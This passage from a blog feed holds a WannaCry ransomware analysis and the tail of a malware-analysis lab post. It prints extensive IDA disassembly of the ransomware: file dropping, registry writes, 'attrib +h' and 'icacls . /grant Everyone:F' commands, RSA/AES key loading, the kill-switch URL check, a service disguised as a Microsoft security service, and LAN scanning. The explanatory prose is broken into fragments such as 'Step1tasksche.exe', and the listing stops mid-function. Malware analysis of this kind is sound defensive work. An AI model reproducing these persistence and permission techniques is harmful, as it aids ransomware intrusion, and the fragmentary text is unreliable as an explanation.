ida_bytes</span><br><span class="line">sea = get_screen_ea()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x00</span>,<span class="number">0x50</span>):</span><br><span class="line">        b = idaapi.get_bytes(sea+i, <span class="number">1</span>)</span><br><span class="line">        decoded_byte = <span class="built_in">int</span>.from_bytes(b, byteorder=<span class="string">&#x27;little&#x27;</span>) ^ <span class="number">0x55</span></span><br><span class="line">        ida_bytes.patch_byte(sea+i, decoded_byte)</span><br></pre></td></tr></table></figure><p>&emsp;20. A<code>xdoor is this backdoor, string decoded for Practical Malware Analysis Lab :)1234</code></p><p>&emsp;21. </p><p>To be continued</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;-1&quot;&gt;&lt;a href=&quot;#-1&quot; class=&quot;headerlink&quot; title=&quot;-1&quot;&gt;&lt;/a&gt;-1&lt;/h1&gt;&lt;p&gt;&amp;emsp;&lt;/p&gt;</summary>
    
    
    
    <category term="re-book" scheme="https://wd-2711.tech/categories/re-book/"/>
    
    
  </entry>
  
  <entry>
    <title>wannaCry-analysis</title>
    <link href="https://wd-2711.tech/2023/08/25/wannaCry-analysis/"/>
    <id>https://wd-2711.tech/2023/08/25/wannaCry-analysis/</id>
    <published>2023-08-25T01:45:33.000Z</published>
    <updated>2023-08-25T14:17:30.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="wannacry"><a href="#wannacry" class="headerlink" title="wannacry"></a>wannacry</h1><p>&emsp;wannacry</p><span id="more"></span><h2 id="taskche-exe"><a href="#taskche-exe" class="headerlink" title="taskche.exe"></a>taskche.exe</h2><p>&emsp;</p><p>&emsp;winmain</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br></pre></td><td class="code"><pre><span class="line">.text:00401FE7                 push    ebp</span><br><span class="line">.text:00401FE8                 mov     ebp, esp</span><br><span class="line">.text:00401FEA                 sub     esp, 6E4h</span><br><span class="line">.text:00401FF0                 mov     al, byte_40F910</span><br><span class="line">.text:00401FF5                 push    ebx</span><br><span class="line">.text:00401FF6                 push    esi</span><br><span class="line">.text:00401FF7                 push    edi</span><br><span class="line">.text:00401FF8                 mov     [ebp+Filename], al</span><br><span class="line">.text:00401FFE                 mov     ecx, 81h</span><br><span class="line">.text:00402003                 xor     eax, eax</span><br><span class="line">.text:00402005                 lea     edi, [ebp+var_20B]</span><br><span class="line">.text:0040200B                 rep stosd</span><br><span class="line">.text:0040200D                 stosw</span><br><span class="line">.text:0040200F                 stosb                   ; </span><br><span class="line">.text:00402010                 lea     eax, [ebp+Filename]</span><br><span class="line">.text:00402016                 push    208h            ; nSize</span><br><span class="line">.text:0040201B                 xor     ebx, ebx</span><br><span class="line">.text:0040201D                 push    eax             ; lpFilename</span><br><span class="line">.text:0040201E                 push    ebx             ; hModule</span><br><span class="line">.text:0040201F                 call    ds:GetModuleFileNameA ; </span><br><span class="line">.text:00402025                 push    offset DisplayName</span><br><span class="line">.text:0040202A                 call    random_string   ; </span><br><span class="line">.text:0040202F                 pop     ecx</span><br><span class="line">.text:00402030                 call    ds:__p___argc</span><br><span class="line">.text:00402036                 cmp     dword ptr [eax], 2</span><br><span class="line">.text:00402039                 jnz     short loc_40208E</span><br><span class="line">.text:0040203B                 push    offset aI       ; &quot;/i&quot;</span><br><span class="line">.text:00402040                 call    ds:__p___argv</span><br><span class="line">.text:00402046                 mov     eax, [eax]</span><br><span class="line">.text:00402048                 push    dword ptr [eax+4] ; Str1</span><br><span class="line">.text:0040204B                 call    strcmp</span><br><span class="line">.text:00402050                 pop     ecx</span><br><span class="line">.text:00402051                 test    eax, eax</span><br><span class="line">.text:00402053                 pop     ecx</span><br><span class="line">.text:00402054                 jnz     short loc_40208E</span><br><span class="line">.text:00402056                 push    ebx             ; wchar_t *</span><br><span class="line">.text:00402057                 call    sub_401B5F</span><br><span class="line">.text:0040205C                 test    eax, eax</span><br><span class="line">.text:0040205E                 pop     ecx</span><br><span class="line">.text:0040205F                 jz      short loc_40208E</span><br><span class="line">.text:00402061                 mov     esi, offset FileName ; &quot;tasksche.exe&quot;</span><br><span class="line">.text:00402066                 push    ebx             ; bFailIfExists</span><br><span class="line">.text:00402067                 lea     eax, [ebp+Filename]</span><br><span class="line">.text:0040206D                 push    esi             ; lpNewFileName</span><br><span class="line">.text:0040206E                 push    eax             ; lpExistingFileName</span><br><span class="line">.text:0040206F                 call    ds:CopyFileA    ; tasksche.exe</span><br><span class="line">.text:00402075                 push    esi             ; lpFileName</span><br><span class="line">.text:00402076                 call    ds:GetFileAttributesA</span><br><span class="line">.text:0040207C                 cmp     eax, 0FFFFFFFFh</span><br><span class="line">.text:0040207F                 jz      short loc_40208E</span><br><span class="line">.text:00402081                 call    create_service_mutex ; </span><br><span class="line">.text:00402086                 test    eax, eax</span><br><span class="line">.text:00402088                 jnz     loc_402165</span><br><span class="line">.text:0040208E</span><br><span class="line">.text:0040208E loc_40208E:                             ; CODE XREF: WinMain(x,x,x,x)+52j</span><br><span class="line">.text:0040208E                                         ; WinMain(x,x,x,x)+6Dj ...</span><br><span class="line">.text:0040208E                 mov     esi, ds:strrchr</span><br><span class="line">.text:00402094                 lea     eax, [ebp+Filename]</span><br><span class="line">.text:0040209A                 push    5Ch ; &#x27;\&#x27;       ; Ch</span><br><span class="line">.text:0040209C                 push    eax             ; Str</span><br><span class="line">.text:0040209D                 call    esi ; strrchr</span><br><span class="line">.text:0040209F                 pop     ecx</span><br><span class="line">.text:004020A0                 test    eax, eax</span><br><span class="line">.text:004020A2                 pop     ecx</span><br><span class="line">.text:004020A3                 jz      short loc_4020B4</span><br><span class="line">.text:004020A5                 lea     eax, [ebp+Filename]</span><br><span class="line">.text:004020AB                 push    5Ch ; &#x27;\&#x27;       ; Ch</span><br><span class="line">.text:004020AD                 push    eax             ; Str</span><br><span class="line">.text:004020AE                 call    esi ; strrchr</span><br><span class="line">.text:004020B0                 pop     ecx</span><br><span class="line">.text:004020B1                 mov     [eax], bl</span><br><span class="line">.text:004020B3                 pop     ecx</span><br><span class="line">.text:004020B4</span><br><span class="line">.text:004020B4 loc_4020B4:                             ; CODE XREF: WinMain(x,x,x,x)+BCj</span><br><span class="line">.text:004020B4                 lea     eax, [ebp+Filename]</span><br><span class="line">.text:004020BA                 push    eax             ; lpPathName</span><br><span class="line">.text:004020BB                 call    ds:SetCurrentDirectoryA ; </span><br><span class="line">.text:004020C1                 push    1</span><br><span class="line">.text:004020C3                 call    write_reg       ; HKEY_LOCAL_MACHINE\Software\WanaCrypt0r\wd</span><br><span class="line">.text:004020C8                 mov     [esp+6F4h+Str], offset Str ; &quot;WNcry@2ol7&quot;</span><br><span class="line">.text:004020CF                 push    ebx             ; hModule</span><br><span class="line">.text:004020D0                 call    release_files   ; </span><br><span class="line">.text:004020D5                 call    write_cwnry     ; c.wnry</span><br><span class="line">.text:004020DA                 push    ebx             ; lpExitCode</span><br><span class="line">.text:004020DB                 push    ebx             ; dwMilliseconds</span><br><span class="line">.text:004020DC                 push    offset CommandLine ; &quot;attrib +h .&quot;</span><br><span class="line">.text:004020E1                 call    exce_cmd        ; </span><br><span class="line">.text:004020E6                 push    ebx             ; lpExitCode</span><br><span class="line">.text:004020E7                 push    ebx             ; dwMilliseconds</span><br><span class="line">.text:004020E8                 push    offset aIcaclsGrantEve ; &quot;icacls . /grant Everyone:F /T /C /Q&quot;</span><br><span class="line">.text:004020ED                 call    exce_cmd        ; Everyone</span><br><span class="line">.text:004020F2                 add     esp, 20h</span><br><span class="line">.text:004020F5                 call    get_api_address</span><br><span class="line">.text:004020FA                 test    eax, eax</span><br><span class="line">.text:004020FC                 jz      short loc_402165</span><br><span class="line">.text:004020FE                 lea     ecx, [ebp+var_6E4]</span><br><span class="line">.text:00402104                 call    Construct       ; </span><br><span class="line">.text:00402109                 push    ebx             ; int</span><br><span class="line">.text:0040210A                 push    ebx             ; int</span><br><span class="line">.text:0040210B                 push    ebx             ; lpFileName</span><br><span class="line">.text:0040210C                 lea     ecx, [ebp+var_6E4]</span><br><span class="line">.text:00402112                 call    importkey_and_alloc ; rsa,0x100000</span><br><span class="line">.text:00402117                 test    eax, eax</span><br><span class="line">.text:00402119                 jz      short loc_40215A</span><br><span class="line">.text:0040211B                 lea     eax, [ebp+var_4]</span><br><span class="line">.text:0040211E                 lea     ecx, [ebp+var_6E4]</span><br><span class="line">.text:00402124                 push    eax             ; int</span><br><span class="line">.text:00402125                 push    offset aTWnry   ; &quot;t.wnry&quot;</span><br><span class="line">.text:0040212A                 mov     [ebp+var_4], ebx</span><br><span class="line">.text:0040212D                 call    dcrypt_twnry    ; t.wnry</span><br><span class="line">.text:00402132                 cmp     eax, ebx</span><br><span class="line">.text:00402134                 jz      short loc_40215A</span><br><span class="line">.text:00402136                 push    [ebp+var_4]     ; int</span><br><span class="line">.text:00402139                 push    eax             ; Src</span><br><span class="line">.text:0040213A                 call    load_dll        ; </span><br><span class="line">.text:0040213F                 pop     ecx</span><br><span class="line">.text:00402140                 cmp     eax, ebx        ; dll</span><br><span class="line">.text:00402142                 pop     ecx</span><br><span class="line">.text:00402143                 jz      short loc_40215A</span><br><span class="line">.text:00402145                 push    offset Str1     ; &quot;TaskStart&quot;</span><br><span class="line">.text:0040214A                 push    eax             ; int</span><br><span class="line">.text:0040214B                 call    get_proc_address ; TaskStart</span><br><span class="line">.text:00402150                 pop     ecx</span><br><span class="line">.text:00402151                 cmp     eax, ebx</span><br><span class="line">.text:00402153                 pop     ecx</span><br><span class="line">.text:00402154                 jz      short loc_40215A</span><br><span class="line">.text:00402156                 push    ebx</span><br><span class="line">.text:00402157                 push    ebx</span><br><span class="line">.text:00402158                 call    eax             ; TaskStart</span><br><span class="line">.text:0040215A</span><br><span class="line">.text:0040215A loc_40215A:                             ; CODE XREF: WinMain(x,x,x,x)+132j</span><br><span class="line">.text:0040215A                                         ; WinMain(x,x,x,x)+14Dj ...</span><br><span class="line">.text:0040215A                 lea     ecx, [ebp+var_6E4]</span><br><span class="line">.text:00402160                 call    destruct        ; </span><br><span class="line">.text:00402165</span><br><span class="line">.text:00402165 loc_402165:                             ; CODE XREF: WinMain(x,x,x,x)+A1j</span><br><span class="line">.text:00402165                                         ; WinMain(x,x,x,x)+115j</span><br><span class="line">.text:00402165                 pop     edi</span><br><span class="line">.text:00402166                 pop     esi</span><br><span class="line">.text:00402167                 xor     eax, eax</span><br><span class="line">.text:00402169                 pop     ebx</span><br><span class="line">.text:0040216A                 leave</span><br><span class="line">.text:0040216B                 retn    10h</span><br><span class="line">.text:0040216B _WinMain@16     endp</span><br></pre></td></tr></table></figure><p>&emsp;</p><p>Step1tasksche.exe</p><p>Step2</p><p>Step3</p><p>Step4<code>c.wnry</code></p><p>Step5<code>attrb +h</code></p><p>Step6<code>icacls ./grant Everyone:F /T /C /Q</code>Everyone</p><p>Step7rsa0x100000</p><p>Step8<code>t.wnry</code><code>TaskStart</code></p><p>&emsp;<code>release_files</code><code>b.wnry</code><code>c.wnry</code><code>r.wnry</code><code>s.wnry</code>tor<code>t.wnry</code>dll<code>u.wnry</code><code>taskse.exe</code><code>taskdl.exe</code></p><p>&emsp;<code>write_cwnry</code>3<code>c.wnry</code><code>get_api_address</code>API<code>CreateFileW</code><code>WriteFile</code><code>get_advapi32_address</code><code>advapi32.dll</code>API</p><p>&emsp;<code>importkey_and_alloc</code>RSA<code>dcrypt_twnry</code><code>load_dll</code></p><p>&emsp;</p><p>1<code>00000000.pky</code>RSA<code>00000000.eky</code><code>00000000.res</code></p><p>2</p><p>&emsp;&emsp;a12<code>00000000.pky</code>221<code>00000000.eky</code></p><p>&emsp;&emsp;b323AES</p><h2 id="mssecsvc-exe"><a href="#mssecsvc-exe" class="headerlink" title="mssecsvc.exe"></a>mssecsvc.exe</h2><p>&emsp;taskche.exe</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">.text:00408140                 sub     esp, 50h</span><br><span class="line">.text:00408143                 push    esi</span><br><span class="line">.text:00408144                 push    edi</span><br><span class="line">.text:00408145                 mov     ecx, 0Eh</span><br><span class="line">.text:0040814A                 mov     esi, offset aHttpWwwIuqerfs ; &quot;http://www.iuqerfsodp9ifjaposdfjhgosuri&quot;...</span><br><span class="line">.text:0040814F                 lea     edi, [esp+58h+szUrl]</span><br><span class="line">.text:00408153                 xor     eax, eax</span><br><span class="line">.text:00408155                 rep movsd</span><br><span class="line">.text:00408157                 movsb</span><br><span class="line">.text:00408158                 mov     [esp+58h+var_17], eax</span><br><span class="line">.text:0040815C                 mov     [esp+58h+var_13], eax</span><br><span class="line">.text:00408160                 mov     [esp+58h+var_F], eax</span><br><span class="line">.text:00408164                 mov     [esp+58h+var_B], eax</span><br><span class="line">.text:00408168                 mov     [esp+58h+var_7], eax</span><br><span class="line">.text:0040816C                 mov     [esp+58h+var_3], ax</span><br><span class="line">.text:00408171                 push    eax             ; dwFlags</span><br><span class="line">.text:00408172                 push    eax             ; lpszProxyBypass</span><br><span class="line">.text:00408173                 push    eax             ; lpszProxy</span><br><span class="line">.text:00408174                 push    1               ; dwAccessType</span><br><span class="line">.text:00408176                 push    eax             ; lpszAgent</span><br><span class="line">.text:00408177                 mov     [esp+6Ch+var_1], al</span><br><span class="line">.text:0040817B                 call    ds:InternetOpenA</span><br><span class="line">.text:00408181                 push    0               ; dwContext</span><br><span class="line">.text:00408183                 push    84000000h       ; dwFlags</span><br><span class="line">.text:00408188                 push    0               ; dwHeadersLength</span><br><span class="line">.text:0040818A                 lea     ecx, [esp+64h+szUrl]</span><br><span class="line">.text:0040818E                 mov     esi, eax</span><br><span class="line">.text:00408190                 push    0               ; lpszHeaders</span><br><span class="line">.text:00408192                 push    ecx             ; lpszUrl</span><br><span class="line">.text:00408193                 push    esi             ; hInternet</span><br><span class="line">.text:00408194                 call    ds:InternetOpenUrlA ; </span><br><span class="line">.text:0040819A                 mov     edi, eax</span><br><span class="line">.text:0040819C                 push    esi             ; hInternet</span><br><span class="line">.text:0040819D                 mov     esi, ds:InternetCloseHandle</span><br><span class="line">.text:004081A3                 test    edi, edi</span><br><span class="line">.text:004081A5                 jnz     short loc_4081BC</span><br><span class="line">.text:004081A7                 call    esi ; InternetCloseHandle</span><br><span class="line">.text:004081A9                 push    0               ; hInternet</span><br><span class="line">.text:004081AB                 call    esi ; InternetCloseHandle</span><br><span class="line">.text:004081AD                 call    being</span><br><span class="line">.text:004081B2                 pop     edi</span><br><span class="line">.text:004081B3                 xor     eax, eax</span><br><span class="line">.text:004081B5                 pop     esi</span><br><span class="line">.text:004081B6                 add     esp, 50h</span><br><span class="line">.text:004081B9                 retn    10h</span><br><span class="line">.text:004081BC ; ---------------------------------------------------------------------------</span><br><span class="line">.text:004081BC</span><br><span class="line">.text:004081BC loc_4081BC:                             ; CODE XREF: WinMain(x,x,x,x)+65j</span><br><span class="line">.text:004081BC                 call    esi ; InternetCloseHandle</span><br><span class="line">.text:004081BE                 push    edi             ; hInternet</span><br><span class="line">.text:004081BF                 call    esi ; InternetCloseHandle</span><br><span class="line">.text:004081C1                 pop     edi</span><br><span class="line">.text:004081C2                 xor     eax, eax</span><br><span class="line">.text:004081C4                 pop     esi</span><br><span class="line">.text:004081C5                 add     esp, 50h</span><br><span class="line">.text:004081C8                 retn    10h</span><br><span class="line">.text:004081C8 _WinMain@16     endp</span><br></pre></td></tr></table></figure><p>&emsp;<code>http://www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com</code><code>being</code>2<code>create_and_start_service</code><code>mssecsvc2.0</code></p><p>&emsp;<code>create_and_start_service</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">// create_and_start_service</span><br><span class="line">.text:00407F20 create_and_start_service proc near      ; CODE XREF: being+20p</span><br><span class="line">.text:00407F20                 call    create_service</span><br><span class="line">.text:00407F25                 call    release_file    ; tasksche.exe</span><br><span class="line">.text:00407F2A                 xor     eax, eax</span><br><span class="line">.text:00407F2C                 retn</span><br><span class="line">.text:00407F2C create_and_start_service endp</span><br><span class="line"></span><br><span class="line">// create_service</span><br><span class="line">.text:00407C40 create_service  proc near               ; CODE XREF: create_and_start_servicep</span><br><span class="line">.text:00407C40</span><br><span class="line">.text:00407C40 Dest            = byte ptr -104h</span><br><span class="line">.text:00407C40</span><br><span class="line">.text:00407C40                 sub     esp, 104h</span><br><span class="line">.text:00407C46                 lea     eax, [esp+104h+Dest]</span><br><span class="line">.text:00407C4A                 push    edi</span><br><span class="line">.text:00407C4B                 push    offset FileName</span><br><span class="line">.text:00407C50                 push    offset Format   ; &quot;%s -m security&quot;</span><br><span class="line">.text:00407C55                 push    eax             ; Dest</span><br><span class="line">.text:00407C56                 call    ds:sprintf      ; </span><br><span class="line">.text:00407C5C                 add     esp, 0Ch</span><br><span class="line">.text:00407C5F                 push    0F003Fh         ; dwDesiredAccess</span><br><span class="line">.text:00407C64                 push    0               ; lpDatabaseName</span><br><span class="line">.text:00407C66                 push    0               ; lpMachineName</span><br><span class="line">.text:00407C68                 call    ds:OpenSCManagerA ; </span><br><span class="line">.text:00407C6E                 mov     edi, eax</span><br><span class="line">.text:00407C70                 test    edi, edi</span><br><span class="line">.text:00407C72                 jz      short loc_407CCA</span><br><span class="line">.text:00407C74                 push    ebx</span><br><span class="line">.text:00407C75                 push    esi</span><br><span class="line">.text:00407C76                 push    0               ; lpPassword</span><br><span class="line">.text:00407C78                 push    0               ; lpServiceStartName</span><br><span class="line">.text:00407C7A                 push    0               ; lpDependencies</span><br><span class="line">.text:00407C7C                 push    0               ; lpdwTagId</span><br><span class="line">.text:00407C7E                 lea     ecx, [esp+120h+Dest]</span><br><span class="line">.text:00407C82                 push    0               ; lpLoadOrderGroup</span><br><span class="line">.text:00407C84                 push    ecx             ; lpBinaryPathName</span><br><span class="line">.text:00407C85                 push    1               ; dwErrorControl</span><br><span class="line">.text:00407C87                 push    2               ; dwStartType</span><br><span class="line">.text:00407C89                 push    10h             ; dwServiceType</span><br><span class="line">.text:00407C8B                 push    0F01FFh         ; dwDesiredAccess</span><br><span class="line">.text:00407C90                 push    offset DisplayName ; &quot;Microsoft Security Center (2.0) Service&quot;</span><br><span class="line">.text:00407C95                 push    offset ServiceName ; &quot;mssecsvc2.0&quot;</span><br><span class="line">.text:00407C9A                 push    edi             ; hSCManager</span><br><span class="line">.text:00407C9B                 call    ds:CreateServiceA ; &quot;mssecsvc2.0&quot;</span><br><span class="line">.text:00407CA1                 mov     ebx, ds:CloseServiceHandle</span><br><span class="line">.text:00407CA7                 mov     esi, eax</span><br><span class="line">.text:00407CA9                 test    esi, esi</span><br><span class="line">.text:00407CAB                 jz      short loc_407CBB</span><br><span class="line">.text:00407CAD                 push    0               ; lpServiceArgVectors</span><br><span class="line">.text:00407CAF                 push    0               ; dwNumServiceArgs</span><br><span class="line">.text:00407CB1                 push    esi             ; hService</span><br><span class="line">.text:00407CB2                 call    ds:StartServiceA ; </span><br><span class="line">.text:00407CB8                 push    esi             ; hSCObject</span><br><span class="line">.text:00407CB9                 call    ebx ; CloseServiceHandle ; </span><br><span class="line">.text:00407CBB</span><br><span class="line">.text:00407CBB loc_407CBB:                             ; CODE XREF: create_service+6Bj</span><br><span class="line">.text:00407CBB                 push    edi             ; hSCObject</span><br><span class="line">.text:00407CBC                 call    ebx ; CloseServiceHandle ; </span><br><span class="line">.text:00407CBE                 pop     esi</span><br><span class="line">.text:00407CBF                 pop     ebx</span><br><span class="line">.text:00407CC0                 xor     eax, eax</span><br><span class="line">.text:00407CC2                 pop     edi</span><br><span class="line">.text:00407CC3                 add     esp, 104h</span><br><span class="line">.text:00407CC9                 retn</span><br><span class="line">.text:00407CCA ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00407CCA</span><br><span class="line">.text:00407CCA loc_407CCA:                             ; CODE XREF: create_service+32j</span><br><span class="line">.text:00407CCA                 xor     eax, eax</span><br><span class="line">.text:00407CCC                 pop     edi</span><br><span class="line">.text:00407CCD                 add     esp, 104h</span><br><span class="line">.text:00407CD3                 retn</span><br><span class="line">.text:00407CD3 create_service  endp</span><br></pre></td></tr></table></figure><p>&emsp;<code>create_and_start_service</code><code>mssecsvc2.0</code><code>tasksche.exe</code></p><p>&emsp;<code>mssecsvc2.0</code></p><p><img src="/images/wannaCry-analysis/image-20230825103915337.png" alt="image-20230825103915337" style="zoom:67%;" /></p><p><img src="/images/wannaCry-analysis/image-20230825103938718.png" alt="image-20230825103938718" style="zoom:67%;" /></p><p>&emsp;<code>service_entry</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">.text:00407BD0 service_entry   proc near               ; CODE XREF: service_main+74p</span><br><span class="line">.text:00407BD0                 call    init_payload</span><br><span class="line">.text:00407BD5                 test    eax, eax</span><br><span class="line">.text:00407BD7                 jnz     short loc_407BDA</span><br><span class="line">.text:00407BD9                 retn</span><br><span class="line">.text:00407BDA ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00407BDA</span><br><span class="line">.text:00407BDA loc_407BDA:                             ; CODE XREF: service_entry+7j</span><br><span class="line">.text:00407BDA                 push    ebx</span><br><span class="line">.text:00407BDB                 push    ebp</span><br><span class="line">.text:00407BDC                 push    esi</span><br><span class="line">.text:00407BDD                 push    edi</span><br><span class="line">.text:00407BDE                 mov     edi, ds:_beginthreadex</span><br><span class="line">.text:00407BE4                 push    0</span><br><span class="line">.text:00407BE6                 push    0</span><br><span class="line">.text:00407BE8                 push    0</span><br><span class="line">.text:00407BEA                 push    offset scan_lan</span><br><span class="line">.text:00407BEF                 push    0</span><br><span class="line">.text:00407BF1                 push    0</span><br><span class="line">.text:00407BF3                 call    edi ; _beginthreadex ; ,</span><br><span class="line">.text:00407BF5                 mov     ebp, ds:CloseHandle</span><br><span class="line">.text:00407BFB                 add     esp, 18h</span><br><span class="line">.text:00407BFE                 test    eax, eax</span><br><span class="line">.text:00407C00                 jz      short loc_407C05</span><br><span class="line">.text:00407C02                 push    eax             ; hObject</span><br><span class="line">.text:00407C03                 call    ebp ; CloseHandle</span><br><span class="line">.text:00407C05</span><br><span class="line">.text:00407C05 loc_407C05:                             ; CODE XREF: service_entry+30j</span><br><span class="line">.text:00407C05                 mov     ebx, ds:Sleep</span><br><span class="line">.text:00407C0B                 xor     esi, esi</span><br><span class="line">.text:00407C0D</span><br><span class="line">.text:00407C0D loc_407C0D:                             ; CODE XREF: 